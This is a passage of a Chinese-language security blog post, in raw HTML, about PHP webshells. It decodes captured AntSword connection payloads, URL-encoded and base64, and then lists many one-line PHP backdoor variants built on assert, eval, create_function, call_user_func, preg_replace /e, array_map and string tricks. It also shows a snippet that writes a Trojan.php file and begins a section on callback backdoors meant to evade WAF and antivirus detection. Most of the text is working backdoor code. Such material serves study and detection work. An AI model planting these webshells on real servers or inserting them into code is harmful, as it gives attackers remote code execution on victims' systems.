class=\"line\">1=assert&amp;2=eval(%24_POST%5B&#x27;shabi&#x27;%5D)&amp;shabi=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2204e9a%22%3Becho%20%40asenc(%24output)%3Becho%20%22d18a2%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B</span><br></pre></td></tr></table></figure>\n<p>urldecode 后的 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1=assert&amp;2=eval($_POST[&#x27;shabi&#x27;])&amp;shabi=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;04e9a&quot;;echo @asenc($output);echo &quot;d18a2&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;\t&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>\n<p><code>1=assert&amp;2=eval($_POST['shell'])</code>  这部分代码与  <code>$_POST['1']($_POST['2']);</code>  构成了一句话木马。等价于下列的代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert(eval($_POST[&#x27;shabi&#x27;]));</span><br></pre></td></tr></table></figure>\n<p>通过 shabi 这个自己设立的变量传递参数，eval () 会执行 shabi 中参数的内容。</p>\n<p>shell=@ini_set(“display_errors”,“0”);@set_time_limit(0);<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>o</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>=</mo><mi mathvariant=\"normal\">@</mi><mi>i</mi><mi>n</mi><msub><mi>i</mi><mi>g</mi></msub><mi>e</mi><mi>t</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>o</mi><mi>p</mi><mi>e</mi><msub><mi>n</mi><mi>b</mi></msub><mi>a</mi><mi>s</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>r</mi><mi mathvariant=\"normal\">&quot;</mi><mo stretchy=\"false\">)</mo><mo separator=\"true\">;</mo><mi>i</mi><mi>f</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">opdir=@ini_get(&quot;open_basedir&quot;);if(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord\">@</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">g</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">b</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">&quot;</span><span class=\"mclose\">)</span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span></span></span></span>opdir) …(省略)… 就是蚁剑通过 shell 参数传递的参数内容，传递的这些参数是蚁剑能够控制后台的核心代码。</p>\n<h4 id=\"连接方式二\"><a class=\"markdownIt-Anchor\" href=\"#连接方式二\">#</a> <strong>连接方式二：</strong></h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115545461.png\" alt=\"image-20221219115545461\"></p>\n<p>一定需要选择 base64 编码，因为蚁剑在处理 base64 时会做如下处理 <code>@eval(@base64_decode</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /uuuu.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">User-Agent: antSword/v2.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 949</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">1=assert&amp;2=%40eval(%40base64_decode(%24_POST%5B_0xe64103ac522dd%5D))%3B&amp;_0xe64103ac522dd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTNjNDkiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjE1N2IyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure>\n<p>urldeocde</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1=assert&amp;2=@eval(@base64_decode($_POST[_0xe64103ac522dd]));&amp;_0xe64103ac522dd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTNjNDkiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjE1N2IyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=</span><br></pre></td></tr></table></figure>\n<p>base64decode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;e3c49&quot;;echo @asenc($output);echo &quot;157b2&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;\t&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>\n<p>当我们选择了 base64 编码的情况下蚁剑在连接密码的基础上添加了 eval 语句，并且对传输的变量 <code>_0xe64103ac522dd</code>  进行了 base64 编码，当 php 执行 <code>_0xe64103ac522dd</code>  里面携带的代码时，蚁剑即可获取和控制整个网站目录。</p>\n<p>如果不选择 base64 编码那么会变成 <code>0=assert&amp;1=%40ini_set(%22display_errors</code> ,assert 中执行的是函数，因此连接失败</p>\n<h4 id=\"不能写成1eval2这种形式呢\"><a class=\"markdownIt-Anchor\" href=\"#不能写成1eval2这种形式呢\">#</a> 不能写成 <code>1=eval&amp;2</code>  这种形式呢</h4>\n<p>原因是因为 eval 不能被可变函数调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//Fatal error: Call to undefined function eval()</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval函数中参数是字符，如：</span><br><span class=\"line\">eval(&#x27;echo 1;&#x27;);</span><br><span class=\"line\">assert函数中参数为表达式 （或者为函数），如：</span><br><span class=\"line\">assert(phpinfo()) </span><br></pre></td></tr></table></figure>\n<h3 id=\"php7中的assert\"><a class=\"markdownIt-Anchor\" href=\"#php7中的assert\">#</a> php7 中的 assert</h3>\n<p>php5 中 assert 是一个函数，我们可以通过 <code>$f='assert';$f(...);</code>  这样的方法来动态执行任意代码。</p>\n<p>但 php7 中，assert 不再是函数，变成了一个语言结构（类似 eval），不能再作为函数名动态执行代码</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222160846771.png\" alt=\"image-20221222160846771\"></p>\n<p>而 eval 终究还是你 eval，永远是语言构造器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(string `$code`): </span><br></pre></td></tr></table></figure>\n<p>把字符串  <code>code</code>  作为 PHP 代码执行。</p>\n<p><strong>注意</strong>：因为是语言构造器而不是函数，不能被 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb25zLnZhcmlhYmxlLWZ1bmN0aW9ucy5waHA=\">可变函数</span> 或者 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb25zLmFyZ3VtZW50cy5waHAjZnVuY3Rpb25zLm5hbWVkLWFyZ3VtZW50cw==\">命名参数</span> 调用。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uZXZhbA==\">PHP: eval - Manual</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uYXNzZXJ0LnBocA==\">PHP: assert - Manual</span></p>\n<h2 id=\"php-一句话木马变形\"><a class=\"markdownIt-Anchor\" href=\"#php-一句话木马变形\">#</a> php 一句话木马变形</h2>\n<p><strong>php 变量</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">$a = &quot;assert&quot;;</span><br><span class=\"line\">$a(@$_POST[&#x27;shell&#x27;]); </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>php 变量简单变形 1</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a=&quot;TR&quot;.&quot;Es&quot;.&quot;sA&quot;;  </span><br><span class=\"line\">$b=strtolower($a);  </span><br><span class=\"line\">$c=strrev($b);  </span><br><span class=\"line\">@$c($_POST[&#x27;shell&#x27;]);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>php 变量简单变形 2</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a=&quot;AssERT&quot;;  </span><br><span class=\"line\">$b=strtolower($a);  </span><br><span class=\"line\">@$b($_POST[&#x27;shell&#x27;]);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>PHP 可变变量</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$bb=&quot;assert&quot;;</span><br><span class=\"line\">$a=&#x27;bb&#x27;;</span><br><span class=\"line\">$&#123;$a&#125;($_POST[&#x27;shell&#x27;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>自定义函数</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fun</span>(<span class=\"params\"><span class=\"variable\">$a</span></span>)</span>&#123;  </span><br><span class=\"line\">    @<span class=\"keyword\">eval</span>(<span class=\"variable\">$a</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">@<span class=\"title function_ invoke__\">fun</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>create_function 函数</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"variable\">$fun</span> = <span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;&#x27;</span>,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$fun</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>call_user_func () 函数</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">call_user_func</span>(assert,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>call_user_func () 函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数</p>\n<p><strong>base64_decode 函数</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"string\">&quot;YXNzZXJ0&quot;</span>);  </span><br><span class=\"line\">@<span class=\"title function_ invoke__\">a</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>preg_replace 函数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php   </span><br><span class=\"line\">    function fun()&#123;  </span><br><span class=\"line\">        return $_POST[&#x27;shell&#x27;];  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    @preg_replace(&quot;/test/e&quot;, fun(), &quot;test123&quot;);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><code>preg_replace</code>  函数一个参数是一个正则表达式，按照 php 的格式，表达式在两个 / 之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php 代码执行。</p>\n<p><strong>pares_str 函数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$str=&quot;a=assert&quot;;</span><br><span class=\"line\">parse_str($str);</span><br><span class=\"line\">$a($_POST[&#x27;shell&#x27;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>执行 pares_str 函数后可以生成一个名为 $a，值为 &quot;assert&quot; 的变量。</p>\n<p><strong>str_replace 函数</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;astestsert&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>file_put_contents 函数</strong></p>\n<p>利用函数生成木马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$test=&#x27;&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#x27;;</span><br><span class=\"line\">file_put_contents(&quot;Trojan.php&quot;, $test);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>array 数组</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=&#x27;assert&#x27;;</span><br><span class=\"line\">array_map(&quot;$a&quot;,$_REQUEST);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>上述定义参数 a 并赋值‘assert’, 利用 array_map () 函数将执行语句进行拼接。最终实现 <code>assert（$_REQUEST）</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$item[&#x27;JON&#x27;]=&#x27;assert&#x27;;</span><br><span class=\"line\">$array[]=$item;</span><br><span class=\"line\">$array[0][&#x27;JON&#x27;]($_POST[&quot;TEST&quot;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>利用函数的组合效果，使得多个参数在传递后组合成一段命令并执行。</p>\n<p><strong>&quot;.&quot; 操作符</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=&quot;e&quot;.&quot;v&quot;;</span><br><span class=\"line\">$b=&quot;a&quot;.&quot;l&quot;;</span><br><span class=\"line\">$c=$a.$b;</span><br><span class=\"line\">$c($_POST[&#x27;a&#x27;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>利用 script 代替 <code>&lt;? 、?&gt;</code>  标签</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;@eval_r($_GET[b])&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80OTQ3MjY0OC9hcnRpY2xlL2RldGFpbHMvMTI1OTQ1NTE0\">eval 与 assert 一句话木马分析_共黄昏的博客 - CSDN 博客_php assert 一句话</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2J5bGZzai9hcnRpY2xlL2RldGFpbHMvMTAxMjI3MjEwP3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjEmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yfmRlZmF1bHR+Q1RSTElTVH5SYXRlLTEtMTAxMjI3MjEwLWJsb2ctMTI1OTQ1NTE0LnBjX3JlbGV2YW50X211bHRpX3BsYXRmb3JtX3doaXRlbGlzdHYzJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yfmRlZmF1bHR+Q1RSTElTVH5SYXRlLTEtMTAxMjI3MjEwLWJsb2ctMTI1OTQ1NTE0LnBjX3JlbGV2YW50X211bHRpX3BsYXRmb3JtX3doaXRlbGlzdHYzJmFtcDt1dG1fcmVsZXZhbnRfaW5kZXg9Mg==\">php 一句话木马变形技巧_bylfsj 的博客 - CSDN 博客_一句话木马 phpinfo</span></p>\n<h2 id=\"bypass各种waf-php回调后门\"><a class=\"markdownIt-Anchor\" href=\"#bypass各种waf-php回调后门\">#</a> bypass 各种 waf-php 回调后门</h2>\n<h3 id=\"0x01-最初的回调后门\"><a class=\"markdownIt-Anchor\" href=\"#0x01-最初的回调后门\">#</a> 0x01 最初的回调后门</h3>\n<p>php 中 call_user_func 是执行回调函数的标准方法，这也是一个比较老的后门了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func(&#x27;assert&#x27;, $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>这样的后门很容易被查杀，所以我们可以简单做一个变型</p>\n<figure class=\"highlight plaintext\"><table><tr><td 